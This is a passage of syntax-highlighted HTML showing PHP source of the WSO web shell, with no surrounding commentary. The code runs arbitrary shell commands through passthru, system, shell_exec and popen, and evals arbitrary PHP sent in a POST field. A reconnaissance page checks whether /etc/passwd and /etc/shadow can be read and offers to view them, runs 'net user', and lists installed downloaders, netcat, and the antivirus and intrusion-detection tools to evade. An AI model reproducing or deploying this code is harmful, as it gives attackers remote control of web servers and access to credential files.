        <span class="o">@</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="o">@</span><span class="nb">system</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;shell_exec&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">);</span>
    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">popen</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)))</span> <span class="p">{</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
            <span class="nv">$out</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="mi">1024</span><span class="p">);</span>
        <span class="nb">pclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">wsoViewSize</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1073741824</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1073741824</span> <span class="p">)</span><span class="o">.</span> <span class="s1">&#39; GB&#39;</span><span class="p">;</span>
    <span class="k">elseif</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1048576</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1048576</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; MB&#39;</span><span class="p">;</span>
    <span class="k">elseif</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1024</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1024</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; KB&#39;</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="k">return</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39; B&#39;</span><span class="p">;</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">wsoPerms</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xC000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xA000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;l&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x6000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;d&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x2000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x1000</span><span class="p">)</span><span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;</span>
    <span class="k">else</span> <span class="nv">$i</span> <span class="o">=</span> <span class="s1">&#39;u&#39;</span><span class="p">;</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0100</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0080</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0040</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0020</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0010</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0008</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0004</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0002</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0001</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;t&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;T&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
    <span class="k">return</span> <span class="nv">$i</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">wsoPermsColor</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
        <span class="k">return</span> <span class="s1">&#39;&amp;lt;font color=#FF0000&amp;gt;&#39;</span><span class="o">.</span><span class="nx">wsoPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
        <span class="k">return</span> <span class="s1">&#39;&amp;lt;font color=white&amp;gt;&#39;</span><span class="o">.</span><span class="nx">wsoPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="k">return</span> <span class="s1">&#39;&amp;lt;font color=#00BB00&amp;gt;&#39;</span><span class="o">.</span><span class="nx">wsoPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;scandir&quot;</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">function</span> <span class="nf">scandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
        <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$filename</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)))</span> <span class="p">{</span>
            <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$files</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">wsoWhich</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;which &#39;</span><span class="o">.</span><span class="nv">$p</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
        <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">actionSecInfo</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Server security information&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">function</span> <span class="nf">wsoSecParam</span><span class="p">(</span><span class="nv">$n</span><span class="p">,</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;span&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$n</span><span class="o">.</span><span class="s1">&#39;: &amp;lt;/span&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span>
                <span class="k">echo</span> <span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">else</span>
                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;pre class=ml1&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
 
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Server software&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="p">));</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Disabled PHP Functions&#39;</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;none&#39;</span><span class="p">);</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Open base dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Safe mode exec dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_exec_dir&#39;</span><span class="p">));</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Safe mode include dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_include_dir&#39;</span><span class="p">));</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;cURL support&#39;</span><span class="p">,</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;curl_version&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;enabled&#39;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span>
    <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_get_client_info&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MySql (&quot;</span><span class="o">.</span><span class="nb">mysql_get_client_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;)&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mssql_connect&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MSSQL&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pg_connect&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;PostgreSQL&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;oci_connect&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;Oracle&quot;</span><span class="p">;</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Supported databases&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">));</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
 
    <span class="k">if</span><span class="p">(</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;nix&#39;</span> <span class="p">)</span> <span class="p">{</span>
        <span class="nv">$userful</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;gcc&#39;</span><span class="p">,</span><span class="s1">&#39;lcc&#39;</span><span class="p">,</span><span class="s1">&#39;cc&#39;</span><span class="p">,</span><span class="s1">&#39;ld&#39;</span><span class="p">,</span><span class="s1">&#39;make&#39;</span><span class="p">,</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;perl&#39;</span><span class="p">,</span><span class="s1">&#39;python&#39;</span><span class="p">,</span><span class="s1">&#39;ruby&#39;</span><span class="p">,</span><span class="s1">&#39;tar&#39;</span><span class="p">,</span><span class="s1">&#39;gzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip2&#39;</span><span class="p">,</span><span class="s1">&#39;nc&#39;</span><span class="p">,</span><span class="s1">&#39;locate&#39;</span><span class="p">,</span><span class="s1">&#39;suidperl&#39;</span><span class="p">);</span>
        <span class="nv">$danger</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;kav&#39;</span><span class="p">,</span><span class="s1">&#39;nod32&#39;</span><span class="p">,</span><span class="s1">&#39;bdcored&#39;</span><span class="p">,</span><span class="s1">&#39;uvscan&#39;</span><span class="p">,</span><span class="s1">&#39;sav&#39;</span><span class="p">,</span><span class="s1">&#39;drwebd&#39;</span><span class="p">,</span><span class="s1">&#39;clamd&#39;</span><span class="p">,</span><span class="s1">&#39;rkhunter&#39;</span><span class="p">,</span><span class="s1">&#39;chkrootkit&#39;</span><span class="p">,</span><span class="s1">&#39;iptables&#39;</span><span class="p">,</span><span class="s1">&#39;ipfw&#39;</span><span class="p">,</span><span class="s1">&#39;tripwire&#39;</span><span class="p">,</span><span class="s1">&#39;shieldcc&#39;</span><span class="p">,</span><span class="s1">&#39;portsentry&#39;</span><span class="p">,</span><span class="s1">&#39;snort&#39;</span><span class="p">,</span><span class="s1">&#39;ossec&#39;</span><span class="p">,</span><span class="s1">&#39;lidsadm&#39;</span><span class="p">,</span><span class="s1">&#39;tcplodg&#39;</span><span class="p">,</span><span class="s1">&#39;sxid&#39;</span><span class="p">,</span><span class="s1">&#39;logcheck&#39;</span><span class="p">,</span><span class="s1">&#39;logwatch&#39;</span><span class="p">,</span><span class="s1">&#39;sysmask&#39;</span><span class="p">,</span><span class="s1">&#39;zmbscap&#39;</span><span class="p">,</span><span class="s1">&#39;sawmill&#39;</span><span class="p">,</span><span class="s1">&#39;wormscan&#39;</span><span class="p">,</span><span class="s1">&#39;ninja&#39;</span><span class="p">);</span>
        <span class="nv">$downloaders</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;wget&#39;</span><span class="p">,</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span><span class="s1">&#39;lynx&#39;</span><span class="p">,</span><span class="s1">&#39;links&#39;</span><span class="p">,</span><span class="s1">&#39;curl&#39;</span><span class="p">,</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;lwp-mirror&#39;</span><span class="p">);</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/passwd&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;yes &amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">/etc/</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">passwd</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;[view]&amp;lt;/a&amp;gt;&quot;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/shadow&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/shadow&#39;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;yes &amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">etc</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">shadow</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;[view]&amp;lt;/a&amp;gt;&quot;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;OS version&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/proc/version&#39;</span><span class="p">));</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Distr name&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/issue.net&#39;</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
            <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$userful</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">wsoWhich</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span>
            <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Userful&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span>
            <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$danger</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">wsoWhich</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span>
            <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Danger&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span>
            <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$downloaders</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">wsoWhich</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span>
            <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Downloaders&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br/&amp;gt;&#39;</span><span class="p">;</span>
            <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;HDD space&#39;</span><span class="p">,</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;df -h&#39;</span><span class="p">));</span>
            <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Hosts&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/hosts&#39;</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;OS Version&#39;</span><span class="p">,</span><span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;ver&#39;</span><span class="p">));</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Account Settings&#39;</span><span class="p">,</span><span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;net accounts&#39;</span><span class="p">));</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;User Accounts&#39;</span><span class="p">,</span><span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;net user&#39;</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">actionPhp</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
        <span class="nv">$temp</span> <span class="o">=</span> <span class="s2">&quot;document.getElementById(&#39;PhpOutput&#39;).style.display=&#39;&#39;;document.getElementById(&#39;PhpOutput&#39;).innerHTML=&#39;&quot;</span><span class="o">.</span><span class="nb">addcslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">()),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
